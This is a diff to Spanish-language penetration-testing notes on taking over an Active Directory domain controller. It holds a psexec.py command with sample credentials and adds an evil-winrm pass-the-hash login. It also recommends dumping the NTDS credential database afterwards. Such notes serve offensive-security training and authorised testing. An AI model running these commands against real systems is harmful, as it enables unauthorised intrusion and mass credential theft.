@@ -10,6 +10,10 @@ Ejemplo:
 ```
 psexec.py wizzz.local/Administrador:Passw0rd@192.168.45.130 cmd.exe
 ```
+También podemos ganar acceso si hemos conseguido su hash mediante evil-winrm
+```
+evil-winrm -i <ip-DC> -u '<Administrator>' -H '<hash>'
+```
 
 # Recomendaciones
 Una vez se compromete el DC es recomendable dumpear el `ntds` de todos los equipos para tener acceso a todos los usuarios del Directorio Activo.
